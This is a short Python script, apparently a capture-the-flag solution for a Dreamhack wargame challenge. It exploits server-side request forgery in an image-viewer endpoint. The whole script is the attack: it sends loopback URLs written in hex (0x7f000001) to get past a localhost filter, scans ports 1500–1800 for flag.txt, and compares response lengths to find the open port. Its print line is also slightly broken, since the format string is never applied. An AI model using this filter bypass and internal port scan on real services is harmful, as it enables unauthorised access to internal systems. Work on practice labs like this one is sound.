import requests
url= "http://host1.dreamhack.games:18398/img_viewer"
for i in range(1500,1801):
   response = requests.post(url, data={'url':'http://0x7f000001:'+str(i)+'/flag.txt'})
   data = len(response.text)
   print('http://127.0.0.1:'+str(i)+'/flag.txt: %d', data)